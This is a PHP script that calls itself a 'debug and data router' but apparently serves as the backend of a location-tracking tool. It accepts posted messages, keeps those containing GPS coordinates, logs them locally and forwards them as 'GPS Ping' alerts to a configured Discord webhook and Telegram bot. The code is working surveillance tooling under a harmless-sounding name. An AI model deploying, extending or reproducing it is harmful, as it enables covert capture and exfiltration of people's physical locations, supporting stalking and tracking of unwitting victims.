<?php
// The3rdEye v1.0 - Advanced Debug & Data Router
// Handles incoming debug data and routes to configured webhooks

$CONFIG_FILE = $_SERVER['HOME'] . '/.the3rdeye/config.ini';
$DISCORD_WEBHOOK = '';
$TELEGRAM_BOT_TOKEN = '';
$TELEGRAM_CHAT_ID = '';

if (file_exists($CONFIG_FILE)) {
    $config = parse_ini_file($CONFIG_FILE);
    $DISCORD_WEBHOOK = isset($config['DISCORD_WEBHOOK']) ? $config['DISCORD_WEBHOOK'] : '';
    $TELEGRAM_BOT_TOKEN = isset($config['TELEGRAM_BOT_TOKEN']) ? $config['TELEGRAM_BOT_TOKEN'] : '';
    $TELEGRAM_CHAT_ID = isset($config['TELEGRAM_CHAT_ID']) ? $config['TELEGRAM_CHAT_ID'] : '';
}

function sendToDiscord($message, $webhook) {
    if (empty($webhook)) return false;
    $payload = json_encode(['content' => $message]);
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

function sendToTelegram($message, $botToken, $chatId) {
    if (empty($botToken) || empty($chatId)) return false;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = ['chat_id' => $chatId, 'text' => $message];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

if (isset($_POST['message'])) {
    $message = $_POST['message'];
    $date = date('Y-m-d H:i:s');
    
    // Filtered phrases we don't need to log
    $filtered_messages = [
        "Location data sent",
        "getLocation called",
        "Geolocation error",
        "Location permission denied"
    ];
    
    $should_filter = false;
    foreach ($filtered_messages as $filtered_phrase) {
        if (strpos($message, $filtered_phrase) !== false) {
            $should_filter = true;
            break;
        }
    }
    
    if (!$should_filter && (
        strpos($message, 'Lat:') !== false || 
        strpos($message, 'Latitude:') !== false || 
        strpos($message, 'Position obtained') !== false
    )) {
        // Log locally
        $location_log = fopen("location_debug.log", "a");
        fwrite($location_log, "[$date] $message\n");
        fclose($location_log);
        
        file_put_contents("LocationLog.log", "[$date] Location data captured\n", FILE_APPEND);
        
        // Route to webhooks if configured
        if (!empty($DISCORD_WEBHOOK)) {
            sendToDiscord("[The3rdEye] GPS Ping: $message", $DISCORD_WEBHOOK);
        }
        if (!empty($TELEGRAM_BOT_TOKEN) && !empty($TELEGRAM_CHAT_ID)) {
            sendToTelegram("[The3rdEye] GPS Ping: $message", $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'No message provided']);
}
?>